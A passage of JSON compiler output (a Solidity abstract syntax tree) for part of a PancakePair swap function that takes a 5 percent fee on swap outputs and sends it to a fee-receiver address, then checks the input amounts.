														],
														"id": 1470,
														"initialValue": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1469,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 1466,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"id": 1464,
																			"name": "amount1Out",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1332,
																			"src": "13163:10:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "*",
																		"rightExpression": {
																			"argumentTypes": null,
																			"hexValue": "35",
																			"id": 1465,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "13176:1:1",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_5_by_1",
																				"typeString": "int_const 5"
																			},
																			"value": "5"
																		},
																		"src": "13163:14:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 1467,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "13162:16:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "313030",
																"id": 1468,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13181:3:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_100_by_1",
																	"typeString": "int_const 100"
																},
																"value": "100"
															},
															"src": "13162:22:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "13150:34:1"
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1473,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1471,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1330,
																"src": "13203:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1472,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13216:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "13203:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1480,
														"nodeType": "IfStatement",
														"src": "13199:60:1",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1475,
																		"name": "_token0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1399,
																		"src": "13233:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1476,
																		"name": "FeeResiver",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 457,
																		"src": "13242:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1477,
																		"name": "tax0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1454,
																		"src": "13254:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1474,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 577,
																	"src": "13219:13:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 1478,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13219:40:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1479,
															"nodeType": "ExpressionStatement",
															"src": "13219:40:1"
														}
													},
													{
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1483,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1481,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1332,
																"src": "13311:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1482,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "13324:1:1",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "13311:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": null,
														"id": 1490,
														"nodeType": "IfStatement",
														"src": "13307:60:1",
														"trueBody": {
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1485,
																		"name": "_token1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1403,
																		"src": "13341:7:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1486,
																		"name": "FeeResiver",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 457,
																		"src": "13350:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 1487,
																		"name": "tax1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1463,
																		"src": "13362:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 1484,
																	"name": "_safeTransfer",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 577,
																	"src": "13327:13:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
																		"typeString": "function (address,address,uint256)"
																	}
																},
																"id": 1488,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13327:40:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 1489,
															"nodeType": "ExpressionStatement",
															"src": "13327:40:1"
														}
													},
													{
														"expression": {
															"argumentTypes": null,
															"id": 1500,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"argumentTypes": null,
																"id": 1491,
																"name": "balance0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1371,
																"src": "13415:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "Assignment",
															"operator": "=",
															"rightHandSide": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1497,
																				"name": "this",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2475,
																				"src": "13460:4:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_contract$_PancakePair_$1700",
																					"typeString": "contract PancakePair"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_contract$_PancakePair_$1700",
																					"typeString": "contract PancakePair"
																				}
																			],
																			"id": 1496,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "13452:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 1498,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13452:13:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1493,
																				"name": "_token0",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1399,
																				"src": "13433:7:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			],
																			"id": 1492,
																			"name": "IERC20",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1784,
																			"src": "13426:6:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																				"typeString": "type(contract IERC20)"
																			}
																		},
																		"id": 1494,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13426:15:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_IERC20_$1784",
																			"typeString": "contract IERC20"
																		}
																	},
																	"id": 1495,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "balanceOf",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 1745,
																	"src": "13426:25:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																		"typeString": "function (address) view external returns (uint256)"
																	}
																},
																"id": 1499,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13426:40:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13415:51:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1501,
														"nodeType": "ExpressionStatement",
														"src": "13415:51:1"
													},
													{
														"expression": {
															"argumentTypes": null,
															"id": 1511,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"argumentTypes": null,
																"id": 1502,
																"name": "balance1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1374,
																"src": "13480:8:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "Assignment",
															"operator": "=",
															"rightHandSide": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1508,
																				"name": "this",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2475,
																				"src": "13525:4:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_contract$_PancakePair_$1700",
																					"typeString": "contract PancakePair"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_contract$_PancakePair_$1700",
																					"typeString": "contract PancakePair"
																				}
																			],
																			"id": 1507,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "13517:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 1509,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13517:13:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 1504,
																				"name": "_token1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1403,
																				"src": "13498:7:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			],
																			"id": 1503,
																			"name": "IERC20",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1784,
																			"src": "13491:6:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																				"typeString": "type(contract IERC20)"
																			}
																		},
																		"id": 1505,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13491:15:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_IERC20_$1784",
																			"typeString": "contract IERC20"
																		}
																	},
																	"id": 1506,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "balanceOf",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 1745,
																	"src": "13491:25:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																		"typeString": "function (address) view external returns (uint256)"
																	}
																},
																"id": 1510,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13491:40:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13480:51:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 1512,
														"nodeType": "ExpressionStatement",
														"src": "13480:51:1"
													}
												]
											},
											{
												"assignments": [
													1515
												],
												"declarations": [
													{
														"constant": false,
														"id": 1515,
														"name": "amount0In",
														"nodeType": "VariableDeclaration",
														"scope": 1623,
														"src": "13551:14:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1514,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13551:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1529,
												"initialValue": {
													"argumentTypes": null,
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1520,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1516,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1371,
															"src": "13568:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": ">",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1519,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1517,
																"name": "_reserve0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1353,
																"src": "13579:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint112",
																	"typeString": "uint112"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"id": 1518,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1330,
																"src": "13591:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13579:22:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13568:33:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1527,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "13666:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"id": 1528,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "13568:99:1",
													"trueExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1526,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1521,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1371,
															"src": "13616:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "-",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1524,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 1522,
																		"name": "_reserve0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1353,
																		"src": "13628:9:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint112",
																			"typeString": "uint112"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 1523,
																		"name": "amount0Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1330,
																		"src": "13640:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "13628:22:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 1525,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "13627:24:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13616:35:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13551:116:1"
											},
											{
												"assignments": [
													1531
												],
												"declarations": [
													{
														"constant": false,
														"id": 1531,
														"name": "amount1In",
														"nodeType": "VariableDeclaration",
														"scope": 1623,
														"src": "13677:14:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1530,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13677:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1545,
												"initialValue": {
													"argumentTypes": null,
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1536,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1532,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1374,
															"src": "13694:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": ">",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1535,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1533,
																"name": "_reserve1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1355,
																"src": "13705:9:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint112",
																	"typeString": "uint112"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"id": 1534,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1332,
																"src": "13717:10:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13705:22:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13694:33:1",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1543,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "13792:1:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"id": 1544,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "13694:99:1",
													"trueExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 1542,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1537,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1374,
															"src": "13742:8:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "-",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 1540,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 1538,
																		"name": "_reserve1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1355,
																		"src": "13754:9:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint112",
																			"typeString": "uint112"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 1539,
																		"name": "amount1Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1332,
																		"src": "13766:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "13754:22:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 1541,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "13753:24:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13742:35:1",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13677:116:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1553,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1549,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1547,
																	"name": "amount0In",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1515,
																	"src": "13824:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1548,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "13836:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "13824:13:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 1552,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 1550,
																	"name": "amount1In",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1531,
																	"src": "13841:9:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 1551,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "13853:1:1",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "13841:13:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "13824:30:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54",
															"id": 1554,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "13868:36:1",
															"subdenomination": null,
															"typeDescriptions": {
